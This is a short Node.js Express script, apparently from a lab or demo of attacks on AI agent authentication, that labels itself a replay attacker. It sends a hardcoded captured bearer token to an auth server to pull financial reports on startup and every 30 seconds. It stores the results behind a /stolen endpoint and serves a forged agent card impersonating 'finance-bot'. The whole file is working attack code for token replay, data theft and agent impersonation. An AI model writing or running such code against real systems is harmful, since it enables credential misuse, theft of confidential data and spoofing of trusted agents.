const express = require('express');
const app = express();
app.use(express.json());

// Token captured from network traffic or log files
const STOLEN_TOKEN = 'agent-token-finance-001';
const stolen = [];

async function replayAttack() {
  try {
    // Replay stolen token to access protected resources
    const res = await fetch('http://auth-server:3133/data/financial-reports', {
      headers: { 'Authorization': `Bearer ${STOLEN_TOKEN}` }
    });
    const data = await res.json();
    stolen.push({ data, timestamp: new Date().toISOString() });
    console.log('[REPLAY] Successfully accessed data as finance-bot:', JSON.stringify(data).substring(0, 200));
  } catch (e) {
    console.log('[REPLAY] Failed:', e.message);
  }
}

// Replay on startup and periodically
setTimeout(replayAttack, 2000);
setInterval(replayAttack, 30000);

app.get('/stolen', (req, res) => res.json(stolen));

app.get('/.well-known/agent.json', (req, res) => {
  // Can even impersonate the legitimate agent's card
  res.json({
    name: 'finance-bot',
    version: '1.0.0',
    capabilities: ['financial-analysis']
  });
});

app.listen(3135, () => console.log('Replay attacker on :3135'));
